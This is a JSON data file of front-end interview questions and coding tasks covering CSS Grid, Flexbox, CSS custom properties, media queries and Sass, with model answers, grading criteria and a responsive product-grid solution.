          "example": "Explanation for D:\n- `grid-template-columns: 1fr 2fr 1fr;` creates three columns. The total fractions are 1+2+1=4. So, the first and third columns get 1/4 of the available space each, and the second column gets 2/4 (or 1/2) of the available space.\n- `grid-column: 1 / span 2;` on `.item-a` means it starts at column line 1 and spans 2 column tracks. This covers the first two columns.\n- `grid-row: 2 / span 1;` on `.item-b` means it starts at row line 2 and spans 1 row track. If there's no `grid-template-rows` defined, the grid implicitly creates rows as needed, so `item-b` would be placed in the second implicitly created row.",
          "tags": [
            "CSS",
            "Grid",
            "Layout",
            "MCQ"
          ],
          "prerequisites": [
            "CSS_grid_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_3",
          "topic": "CSS Grid vs. Flexbox Use Cases",
          "level": "hard",
          "type": "open",
          "question": "Describe a scenario where CSS Grid would be a more suitable layout tool than Flexbox, and explain why. Conversely, describe a scenario where Flexbox would be preferred over CSS Grid.",
          "answer": "",
          "analysisPoints": [
            "Ability to articulate the core differences (1D vs 2D).",
            "Providing concrete examples for each.",
            "Justifying the choice of layout method based on complexity and dimension.",
            "Mentioning limitations of one when attempting the other.",
            "Understanding when they can be combined effectively (e.g., Grid for macro-layout, Flexbox for micro-layout)."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "1D layout",
            "2D layout",
            "Main Axis",
            "Cross Axis",
            "Page Layout",
            "Component Layout"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of definitions.",
            "Relevance and specificity of examples.",
            "Depth of understanding of their respective strengths and weaknesses.",
            "Demonstration of practical application knowledge."
          ],
          "example": "CSS Grid is more suitable for **overall page layouts** or complex sections where you need to manage content in both rows and columns simultaneously. For example, a dashboard layout with a fixed header, sidebar, main content area, and a footer, where the main content itself might be divided into multiple sections arranged in a grid. Grid excels here because it provides explicit control over the entire 2D space, allowing items to span multiple rows/columns effortlessly, and handles alignment across both axes intrinsically. Trying to achieve this with Flexbox would involve deeply nested flex containers, making the CSS complex, harder to maintain, and less readable.\n\nFlexbox is preferred for **arranging items within a single dimension**, either in a row or a column. For instance, a navigation bar where items need to be spaced out, aligned vertically, or wrapped; or a list of form inputs that should stack vertically and align their labels. Flexbox provides powerful alignment and distribution properties (e.g., `justify-content`, `align-items`, `flex-grow`, `flex-shrink`) that are specifically designed for efficient one-dimensional content flow. While Grid could also be used for simple row/column layouts, Flexbox's simpler syntax and dedicated properties make it more concise and intuitive for these specific 1D arrangements.",
          "tags": [
            "CSS",
            "Layout",
            "Grid",
            "Flexbox",
            "Comparison",
            "Architecture"
          ],
          "prerequisites": [
            "CSS_grid",
            "Flexbox_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_css_grid_4",
          "topic": "CSS Grid Terminology",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the CSS property used to define the space between grid cells?",
          "answer": "`gap` (or the older `grid-gap`)",
          "analysisPoints": [],
          "keyConcepts": [
            "CSS Grid",
            "gap property"
          ],
          "evaluationCriteria": [
            "Recall of basic CSS Grid properties"
          ],
          "example": "",
          "tags": [
            "CSS",
            "Grid",
            "Terminology"
          ],
          "prerequisites": [
            "CSS_grid_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_variables_1",
          "topic": "CSS Custom Properties Benefits",
          "level": "medium",
          "type": "open",
          "question": "Explain at least three significant advantages of using CSS Custom Properties (CSS Variables) over hardcoded values in your stylesheets.",
          "answer": "",
          "analysisPoints": [
            "Ability to list and elaborate on benefits.",
            "Distinguishing between compile-time (Sass) and runtime (CSS) variables.",
            "Practical scenarios (theming, maintainability, dynamic manipulation)."
          ],
          "keyConcepts": [
            "CSS Variables",
            "Custom Properties",
            "Maintainability",
            "Theming",
            "Dynamic Styling",
            "JavaScript interaction"
          ],
          "evaluationCriteria": [
            "Thorough explanation of advantages",
            "Demonstration of practical understanding",
            "Clarity and organization of points"
          ],
          "example": "1.  **Maintainability and Consistency:** CSS variables allow you to centralize common values (like colors, font sizes, spacing) in one place, typically in the `:root` selector. If a design needs to change a specific color, you only need to update the variable's value once, and the change propagates everywhere the variable is used. This vastly improves maintainability compared to finding and replacing every hardcoded instance.\n2.  **Dynamic Theming and Runtime Manipulation:** Unlike preprocessor variables (e.g., Sass), CSS variables are part of the DOM and are live at runtime in the browser. This means their values can be changed dynamically using JavaScript. This capability is fundamental for features like dark mode toggles, user-customizable themes, or dynamic adjustments based on user interaction or external data, without requiring a CSS recompile or complex class-swapping logic for every element.\n3.  **Readability and Semantics:** Using meaningful variable names (e.g., `--primary-color`, `--spacing-md`) makes your CSS code more self-documenting and readable. Developers can quickly understand the purpose of a value rather than deciphering an arbitrary hex code or pixel value.",
          "tags": [
            "CSS",
            "Variables",
            "Custom Properties",
            "Maintainability",
            "Theming",
            "Dynamic Styling"
          ],
          "prerequisites": [
            "CSS_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_variables_2",
          "topic": "CSS Custom Properties Syntax and Scope",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following CSS snippets correctly declares a global CSS Custom Property and uses it with a fallback value?\n\nA.\n```css\n$main-bg: #fff;\nbody { background-color: $main-bg; }\n```\nB.\n```css\n:root {\n  --main-bg-color: #fff;\n}\np {\n  background-color: var(--main-bg-color, lightgray);\n}\n```\nC.\n```css\nvar(--main-bg-color: #fff);\nbody { background-color: var(--main-bg-color); }\n```\nD.\n```css\nhtml {\n  main-bg-color: #fff;\n}\ndiv {\n  background-color: var(main-bg-color);\n}\n```",
          "answer": "B. \n```css\n:root {\n  --main-bg-color: #fff;\n}\np {\n  background-color: var(--main-bg-color, lightgray);\n}\n```",
          "options": [
            "A.\n```css\n$main-bg: #fff;\nbody { background-color: $main-bg; }\n```",
            "B.\n```css\n:root {\n  --main-bg-color: #fff;\n}\np {\n  background-color: var(--main-bg-color, lightgray);\n}\n```",
            "C.\n```css\nvar(--main-bg-color: #fff);\nbody { background-color: var(--main-bg-color); }\n```",
            "D.\n```css\nhtml {\n  main-bg-color: #fff;\n}\ndiv {\n  background-color: var(main-bg-color);\n}\n```"
          ],
          "analysisPoints": [
            "Correct prefix for CSS variables (`--`).",
            "Correct use of `:root` for global scope.",
            "Correct `var()` function syntax for usage.",
            "Correct fallback value syntax within `var()`."
          ],
          "keyConcepts": [
            "CSS Variables",
            "Custom Properties",
            ":root selector",
            "var() function",
            "fallback values",
            "syntax"
          ],
          "evaluationCriteria": [
            "Understanding of CSS variable declaration",
            "Correct usage of `var()` function",
            "Knowledge of fallback mechanism",
            "Distinction from preprocessor variables"
          ],
          "example": "Option A uses Sass variable syntax, not native CSS. Option C has incorrect declaration syntax. Option D uses incorrect declaration and usage syntax for CSS variables. Option B correctly declares `--main-bg-color` on `:root` for global scope and uses it with a fallback value `lightgray` inside the `var()` function.",
          "tags": [
            "CSS",
            "Variables",
            "Syntax",
            "MCQ"
          ],
          "prerequisites": [
            "CSS_variables_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_variables_3",
          "topic": "CSS Custom Properties vs. Sass Variables",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast CSS Custom Properties with Sass variables. When would you choose one over the other, or use both?",
          "answer": "",
          "analysisPoints": [
            "Clearly define each.",
            "Highlight key differences: runtime vs. compile-time, scope, JavaScript access, browser support.",
            "Provide use cases for each.",
            "Discuss scenarios where they complement each other (e.g., Sass for complex calculations/mixins, CSS variables for theming/runtime adjustments)."
          ],
          "keyConcepts": [
            "CSS Variables",
            "Sass Variables",
            "Compile-time",
            "Runtime",
            "JavaScript Interactivity",
            "Theming",
            "Modularity",
            "Build Process"
          ],
          "evaluationCriteria": [
            "Comprehensive comparison of features and limitations.",
            "Strategic decision-making ability for tool selection.",
            "Understanding of frontend build processes.",
            "Nuanced understanding of advanced CSS techniques."
          ],
          "example": "CSS Custom Properties (CSS Variables) are native to CSS and operate at **runtime** in the browser. They are declared with `--` prefix and accessed with `var()`. Their key strengths include cascading inheritance, dynamic manipulation via JavaScript (enabling real-time theme switching or UI adjustments), and debugging directly in browser developer tools. They are ideal for theming, component-level customizability, and values that might change dynamically based on user interaction or system preferences (`prefers-color-scheme`).\n\nSass variables are part of a **CSS preprocessor** and are processed at **compile-time**. They are declared with a `$` prefix. Their values are interpolated into the final CSS output *before* the browser sees it. Sass variables are excellent for storing values that are static once compiled (e.g., breakpoint values, consistent spacing units), for performing complex calculations, or for generating repetitive CSS with loops and functions. They are invaluable for modularizing large stylesheets and improving developer efficiency during the development phase.\n\n**When to choose:**\n*   Choose **CSS Custom Properties** when you need dynamic changes at runtime (e.g., dark mode toggle, user-defined color themes), when you want values to cascade and be overridden by descendant elements, or when you want direct JavaScript access to modify styles.\n*   Choose **Sass variables** when you need compile-time features like mathematical operations, functions, or when defining values that are part of a build-time design system (like grid column counts, base font sizes that don't need runtime modification).\n\n**Using both:** It's common and beneficial to use both. Sass variables can define the core static values for your design system (e.g., `$base-color: #007bff;`). Then, CSS Custom Properties can be initialized with these Sass variables, and exposed for runtime modification (e.g., `:root { --primary-color: #{$base-color}; }`). This leverages Sass's powerful processing capabilities for development while gaining CSS Custom Properties' runtime flexibility.",
          "tags": [
            "CSS",
            "Sass",
            "Variables",
            "Comparison",
            "Architecture",
            "Best Practices"
          ],
          "prerequisites": [
            "CSS_variables",
            "Sass_basics"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_media_queries_1",
          "topic": "Media Queries Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of media queries in web development?",
          "answer": "To apply different CSS styles based on device characteristics, most commonly screen width, enabling responsive web design.",
          "analysisPoints": [],
          "keyConcepts": [
            "Media Queries",
            "Responsive Web Design",
            "Device Characteristics"
          ],
          "evaluationCriteria": [
            "Understanding of core functionality"
          ],
          "example": "",
          "tags": [
            "CSS",
            "Responsive Design",
            "Media Queries"
          ],
          "prerequisites": [
            "CSS_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_media_queries_2",
          "topic": "Mobile-First Approach",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following CSS:\n\n```css\n/* Snippet A */\nbody {\n  font-size: 14px;\n}\n@media (min-width: 768px) {\n  body {\n    font-size: 16px;\n  }\n}\n\n/* Snippet B */\nbody {\n  font-size: 16px;\n}\n@media (max-width: 767px) {\n  body {\n    font-size: 14px;\n  }\n}\n```\n\nWhich snippet exemplifies the 'mobile-first' approach and why?",
          "answer": "Snippet A exemplifies the 'mobile-first' approach because it sets the smallest font size as the base style first, and then *progressively enhances* for larger screens using `min-width` media queries.",
          "options": [
            "Snippet A, because it uses `min-width` queries to apply styles for larger screens after defining base styles.",
            "Snippet B, because it defines a default for larger screens and then uses `max-width` to override for smaller screens.",
            "Both snippets represent a mobile-first approach equally well, as they both adjust font sizes based on screen width.",
            "Neither snippet represents a mobile-first approach as they only modify font-size and not layout."
          ],
          "analysisPoints": [
            "Understanding of `min-width` vs `max-width` in the context of mobile-first.",
            "Definition of 'mobile-first': base styles for smallest, then enhance.",
            "Benefits of mobile-first (performance, UX)."
          ],
          "keyConcepts": [
            "Media Queries",
            "Mobile-First",
            "Responsive Web Design",
            "min-width",
            "max-width",
            "Progressive Enhancement"
          ],
          "evaluationCriteria": [
            "Correctly identifying mobile-first implementation",
            "Understanding the rationale behind `min-width` for mobile-first",
            "Knowledge of responsive design strategies"
          ],
          "example": "Snippet A establishes a default `font-size` of `14px` for `body`. This style applies to all devices, inherently targeting the smallest screens first. Then, the `@media (min-width: 768px)` rule adds an enhancement for screens 768px and wider, increasing the `font-size` to `16px`. This is the core principle of mobile-first: start simple and add complexity as screen real estate allows. Snippet B, conversely, defines a default for larger screens and then *overrides* it for smaller screens, which is a desktop-first approach.",
          "tags": [
            "CSS",
            "Responsive Design",
            "Media Queries",
            "Mobile-First",
            "MCQ"
          ],
          "prerequisites": [
            "Media_queries_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_media_queries_3",
          "topic": "Media Query Capabilities",
          "level": "medium",
          "type": "open",
          "question": "Beyond `min-width` and `max-width`, list and briefly explain two other media features you can use in a media query to provide a more tailored user experience.",
          "answer": "",
          "analysisPoints": [
            "Ability to recall various media features.",
            "Brief and accurate explanation of their purpose.",
            "Connecting features to user experience improvements."
          ],
          "keyConcepts": [
            "Media Features",
            "Orientation",
            "Resolution",
            "prefers-color-scheme",
            "User Preferences"
          ],
          "evaluationCriteria": [
            "Breadth of knowledge on media queries",
            "Accuracy of explanations",
            "Understanding of practical applications"
          ],
          "example": "1.  **`orientation`**: This media feature allows you to apply styles based on whether the device is in `portrait` (height is greater than or equal to width) or `landscape` (width is greater than height) mode. For example:\n    ```css\n    @media (orientation: landscape) {\n      .gallery-container {\n        grid-template-columns: repeat(4, 1fr);\n      }\n    }\n    ```\n    This can be useful for adjusting image galleries, video layouts, or overall content flow to better fit the available screen shape, enhancing readability and visual appeal.\n\n2.  **`prefers-color-scheme`**: This feature allows you to detect if the user has requested the system to use a light or dark color theme. It can take values `light` or `dark`. For example:\n    ```css\n    @media (prefers-color-scheme: dark) {\n      body {\n        background-color: #333;\n        color: #f0f0f0;\n      }\n    }\n    ```\n    This is crucial for providing an accessible and personalized user experience, respecting system-wide user preferences for dark mode, which can reduce eye strain in low-light conditions.",
          "tags": [
            "CSS",
            "Media Queries",
            "User Experience",
            "Accessibility"
          ],
          "prerequisites": [
            "Media_queries_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_sass_1",
          "topic": "Sass Variables",
          "level": "easy",
          "type": "flashcard",
          "question": "How are variables declared in Sass/SCSS, and what is their primary benefit?",
          "answer": "Sass/SCSS variables are declared using a `$` prefix (e.g., `$primary-color: #336699;`). Their primary benefit is to store reusable values, improving consistency and maintainability by centralizing changes.",
          "analysisPoints": [],
          "keyConcepts": [
            "Sass",
            "SCSS",
            "Variables",
            "Syntax",
            "Maintainability"
          ],
          "evaluationCriteria": [
            "Recall of basic Sass variable syntax and purpose"
          ],
          "example": "",
          "tags": [
            "Sass",
            "SCSS",
            "Variables"
          ],
          "prerequisites": [
            "Sass_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_sass_2",
          "topic": "Sass Nesting",
          "level": "medium",
          "type": "open",
          "question": "What is CSS nesting in Sass/SCSS, and what are its advantages and potential drawbacks?",
          "answer": "",
          "analysisPoints": [
            "Define nesting and its syntax.",
            "List advantages (readability, organization, reduced repetition).",
            "Discuss drawbacks (over-qualification, specificity issues, larger file sizes, readability if overused)."
          ],
          "keyConcepts": [
            "Sass",
            "SCSS",
            "Nesting",
            "Specificity",
            "CSS Architecture",
            "Maintainability"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation of concept",
            "Balanced view of pros and cons",
            "Practical advice on usage"
          ],
          "example": "CSS nesting in Sass/SCSS allows you to write CSS selectors inside other selectors, mirroring the structure of your HTML. For example:\n```scss\nnav {\n  ul {\n    margin: 0;\n    li {\n      display: inline-block;\n      a {\n        color: blue;\n      }\n    }\n  }\n}\n```\n\n**Advantages:**\n1.  **Improved Readability and Organization:** It makes the stylesheet structure more intuitive by visually representing the parent-child relationships in the DOM. Related styles are grouped together.\n2.  **Reduced Repetition:** You don't have to repeatedly type parent selectors, leading to more concise code.\n3.  **Encourages Modularity:** It can help group styles for specific components, making it easier to manage and move sections of CSS.\n\n**Potential Drawbacks:**\n1.  **Over-Qualified Selectors:** Excessive nesting can lead to very long and highly specific CSS selectors (e.g., `nav ul li a`). This can make it difficult to override styles later in the cascade and increases specificity conflicts.\n2.  **Increased File Size:** While reducing repetition in SCSS, over-nesting might generate larger CSS files with redundant selector paths, though compilers often optimize this.\n3.  **Readability Issues (if overused):** Deep nesting can make the code harder to read and navigate than a flatter structure, ironically defeating one of its primary advantages.\n\nBest practice is to keep nesting to a minimum (typically 3-4 levels deep at most) and use it judiciously to improve organization without creating overly specific or unreadable selectors.",
          "tags": [
            "Sass",
            "SCSS",
            "Nesting",
            "CSS Architecture",
            "Best Practices"
          ],
          "prerequisites": [
            "Sass_basics",
            "CSS_specificity"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_sass_3",
          "topic": "Sass Mixins",
          "level": "medium",
          "type": "mcq",
          "question": "You want to create a reusable block of CSS that includes vendor prefixes for `border-radius` and can accept a custom radius value. Which Sass feature is most appropriate for this?\n\nA. Sass Variable\nB. Sass Nesting\nC. Sass Mixin\nD. Sass Function",
          "answer": "C. Sass Mixin",
          "options": [
            "A. Sass Variable",
            "B. Sass Nesting",
            "C. Sass Mixin",
            "D. Sass Function"
          ],
          "analysisPoints": [
            "Understanding of mixin's purpose: reusable code blocks, especially with arguments.",
            "Distinguishing mixins from variables (for values), nesting (for structure), and functions (for returning single values)."
          ],
          "keyConcepts": [
            "Sass",
            "SCSS",
            "Mixins",
            "Vendor Prefixes",
            "Reusability",
            "Arguments"
          ],
          "evaluationCriteria": [
            "Correctly identifying the appropriate Sass feature for a given problem",
            "Understanding of mixin functionality and advantages"
          ],
          "example": "A Sass Mixin is perfect for this scenario. It allows you to define a block of CSS (like `border-radius` with vendor prefixes) and pass arguments (like `$radius`) to it, making it highly flexible and reusable. You would define it with `@mixin` and include it with `@include`:\n\n```scss\n@mixin border-radius($radius) {\n  -webkit-border-radius: $radius;\n  -moz-border-radius: $radius;\n  border-radius: $radius;\n}\n\n.my-element {\n  @include border-radius(5px);\n}\n```\n\nSass Variables are for storing single values. Nesting is for organizing selectors. Sass Functions return a single value and are generally used for calculations, not for injecting multiple CSS declarations.",
          "tags": [
            "Sass",
            "SCSS",
            "Mixins",
            "MCQ"
          ],
          "prerequisites": [
            "Sass_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_sass_4",
          "topic": "Sass Features Application",
          "level": "hard",
          "type": "code",
          "question": "Write SCSS code that defines a base font size, a primary color, and a mixin for creating a 'button' style that accepts `background-color` and `text-color` arguments. Then, use nesting to style a `header` element containing a `nav` with a `ul` and `li` items, and apply the button mixin to a `.cta-button` class within the `header`.",
          "answer": "",
          "options": [],
          "analysisPoints": [
            "Correct declaration and usage of Sass variables.",
            "Proper definition and inclusion of a mixin with arguments.",
            "Effective use of nesting for complex selector structures.",
            "Understanding of SCSS syntax."
          ],
          "keyConcepts": [
            "Sass",
            "SCSS",
            "Variables",
            "Nesting",
            "Mixins",
            "CSS Architecture"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of SCSS.",
            "Logical application of all requested Sass features.",
            "Readability and organization of the SCSS code.",
            "Demonstration of practical SCSS usage."
          ],
          "example": "```scss\n// SCSS Code\n\n// Variables\n$base-font-size: 16px;\n$primary-brand-color: #007bff;\n$text-light: #fff;\n$text-dark: #333;\n\n// Mixin for a button style\n@mixin button-style($bg-color: $primary-brand-color, $text-color: $text-light) {\n  display: inline-block;\n  padding: 10px 20px;\n  border: none;\n  border-radius: 5px;\n  background-color: $bg-color;\n  color: $text-color;\n  font-size: $base-font-size;\n  cursor: pointer;\n  text-decoration: none;\n  text-align: center;\n  transition: background-color 0.3s ease;\n\n  &:hover {\n    opacity: 0.9;\n  }\n}\n\n// Nesting for header, nav, ul, li\nheader {\n  background-color: #f8f9fa;\n  padding: 15px 0;\n  border-bottom: 1px solid #e9ecef;\n  text-align: center;\n\n  nav {\n    max-width: 960px;\n    margin: 0 auto;\n\n    ul {\n      list-style: none;\n      margin: 0;\n      padding: 0;\n      display: flex;\n      justify-content: center;\n      gap: 20px;\n\n      li {\n        a {\n          color: $text-dark;\n          text-decoration: none;\n          font-weight: bold;\n          font-size: $base-font-size;\n\n          &:hover {\n            color: $primary-brand-color;\n          }\n        }\n      }\n    }\n  }\n\n  .cta-button {\n    margin-top: 20px;\n    @include button-style($primary-brand-color, $text-light); // Applying the mixin\n  }\n}\n\n// Example of another button type using the mixin with different arguments\n.secondary-button {\n  @include button-style(#6c757d, $text-light);\n}\n\n```",
          "tags": [
            "Sass",
            "SCSS",
            "Coding Challenge",
            "Variables",
            "Nesting",
            "Mixins"
          ],
          "prerequisites": [
            "Sass_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_css_grid_1",
          "title": "Build a Responsive Product Grid",
          "description": "\nImplement a responsive product listing page using CSS Grid. The layout should adapt based on screen size:\n\n1.  **Mobile (default):** Products should display in a single column.\n2.  **Tablet (min-width: 768px):** Products should display in 2 columns with a 15px gap.\n3.  **Desktop (min-width: 1024px):** Products should display in 4 columns with a 20px gap.\n\nEach product card should be a flex container to vertically align content (image, title, price, button) and have a minimum height. Ensure the product images are responsive and fill their container.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Responsive Product Grid</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <div class=\"product-grid\">\n        <!-- Repeat this product-card for at least 8 items -->\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 1\">\n            <div class=\"card-content\">\n                <h3>Product Title 1</h3>\n                <p class=\"price\">$29.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 2\">\n            <div class=\"card-content\">\n                <h3>Product Title 2 (Longer)</h3>\n                <p class=\"price\">$49.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 3\">\n            <div class=\"card-content\">\n                <h3>Product Title 3</h3>\n                <p class=\"price\">$19.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n         <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 4\">\n            <div class=\"card-content\">\n                <h3>Product Title 4</h3>\n                <p class=\"price\">$59.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 5\">\n            <div class=\"card-content\">\n                <h3>Product Title 5</h3>\n                <p class=\"price\">$9.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 6\">\n            <div class=\"card-content\">\n                <h3>Product Title 6</h3>\n                <p class=\"price\">$79.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 7\">\n            <div class=\"card-content\">\n                <h3>Product Title 7</h3>\n                <p class=\"price\">$34.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n        <div class=\"product-card\">\n            <img src=\"https://via.placeholder.com/200x150?text=Product+Image\" alt=\"Product 8\">\n            <div class=\"card-content\">\n                <h3>Product Title 8</h3>\n                <p class=\"price\">$12.99</p>\n                <button>Add to Cart</button>\n            </div>\n        </div>\n    </div>\n</body>\n</html>\n\n/* style.css */\nbody {\n    font-family: sans-serif;\n    margin: 20px;\n    background-color: #f4f4f4;\n}\n\n.product-grid {\n    /* Your CSS Grid styles here */\n    border: 1px solid #ccc;\n    padding: 10px;\n    background-color: #fff;\n}\n\n.product-card {\n    border: 1px solid #eee;\n    padding: 15px;\n    background-color: #fff;\n    box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n    min-height: 300px; /* Example min-height */\n    /* Your Flexbox styles for card content here */\n}\n\n.product-card img {\n    max-width: 100%;\n    height: auto;\n    display: block;\n    margin-bottom: 10px;\n}\n\n.product-card h3 {\n    margin-top: 0;\n    font-size: 1.2em;\n}\n\n.product-card .price {\n    font-weight: bold;\n    color: #e67e22;\n    margin-bottom: 10px;\n}\n\n.product-card button {\n    background-color: #007bff;\n    color: white;\n    border: none;\n    padding: 10px 15px;\n    cursor: pointer;\n    border-radius: 5px;\n    width: 100%;\n}\n",
          "solutionCode": "/* style.css */\nbody {\n    font-family: sans-serif;\n    margin: 20px;\n    background-color: #f4f4f4;\n}\n\n.product-grid {\n    display: grid; /* Establish grid container */\n    grid-template-columns: 1fr; /* Mobile: Single column */\n    gap: 15px; /* Default gap */\n    border: 1px solid #ccc;\n    padding: 10px;\n    background-color: #fff;\n}\n\n/* Tablet layout */\n@media (min-width: 768px) {\n    .product-grid {\n        grid-template-columns: repeat(2, 1fr); /* 2 columns */\n        gap: 15px;\n    }\n}\n\n/* Desktop layout */\n@media (min-width: 1024px) {\n    .product-grid {\n        grid-template-columns: repeat(4, 1fr); /* 4 columns */\n        gap: 20px;\n    }\n}\n\n.product-card {\n    border: 1px solid #eee;\n    padding: 15px;\n    background-color: #fff;\n    box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n    min-height: 300px; \n    display: flex; /* Make card content a flex container */\n    flex-direction: column; /* Stack items vertically */\n    justify-content: space-between; /* Push button to bottom */\n}\n\n.product-card img {\n    max-width: 100%;\n    height: auto;\n    display: block;\n    margin-bottom: 10px;\n}\n\n.product-card .card-content {\n  display: flex;\n  flex-direction: column;\n  flex-grow: 1; /* Allows content area to take available space */\n}\n\n.product-card h3 {\n    margin-top: 0;\n    font-size: 1.2em;\n    flex-grow: 1; /* Title takes available space to push price/button down */\n}\n\n.product-card .price {\n    font-weight: bold;\n    color: #e67e22;\n    margin-top: auto; /* Push price to bottom of content area, above button */\n    margin-bottom: 10px; \n}\n\n.product-card button {\n    background-color: #007bff;\n    color: white;\n    border: none;\n    padding: 10px 15px;\n    cursor: pointer;\n    border-radius: 5px;\n    width: 100%;\n    margin-top: 10px; /* Space above button */\n}\n",
          "testCases": [
            "**Mobile View (e.g., < 768px):** Verify that product cards stack vertically, one per row, with appropriate spacing.",
            "**Tablet View (e.g., 768px - 1023px):** Check that product cards arrange into two columns with 15px gaps. Ensure vertical alignment of content within cards.",
            "**Desktop View (e.g., >= 1024px):** Confirm that product cards arrange into four columns with 20px gaps. Verify all content within cards (image, title, price, button) is correctly positioned and aligned.",
            "**Content Overflow:** Add a product with a very long title or description. Ensure the card's minimum height and flexbox properties correctly handle the content without breaking the layout or overflowing.",
            "**Responsiveness on Resize:** Dynamically resize the browser window to smoothly transition between the different grid layouts and observe gap changes."
          ],
          "hints": [
            "Start by setting `display: grid;` on `.product-grid` and define its `grid-template-columns` for the mobile-first approach. This will be your single column default.",
            "Use `repeat()` and `fr` units for defining column tracks within media queries.",
            "Remember to apply media queries with `min-width` breakpoints for tablet and desktop layouts.",
            "For vertical alignment and pushing the button to the bottom of the card, apply `display: flex; flex-direction: column;` to the `.product-card` itself. Then, use `margin-top: auto;` on the last element you want pushed to the bottom (e.g., the button or price element) within the flex container.",
            "Consider making the `card-content` or `h3` flex items that `flex-grow: 1` to distribute space and push elements down effectively."
          ],
          "tags": [
            "CSS Grid",
            "Responsive Design",
            "Media Queries",
            "Flexbox",
            "Layout",
            "Frontend"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "CSS_grid",
            "Media_queries",
            "Flexbox_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Mobile-First Design",
            "Web Accessibility"
          ]
        },
        {
          "id": "task_css_variables_1",
          "title": "Create a Theming System with CSS Variables",
          "description": "\nImplement a simple light/dark theming system for a webpage using CSS Custom Properties and JavaScript. Your task is to:\n\n1.  Define a set of CSS variables for colors (background, text, primary accent) in a `:root` selector for the default (light) theme.\n2.  Create a `.dark-theme` class that, when applied to the `html` element, overrides these variables with dark mode values.\n3.  Ensure at least a `body`, a `header`, and a `button` element use these CSS variables for their styling.\n4.  Add a JavaScript button that toggles the `dark-theme` class on the `html` element, switching the theme dynamically.\n\nYour solution should demonstrate effective use of CSS variables for theming and their dynamic manipulation with JavaScript.\n",
          "difficulty": "medium",
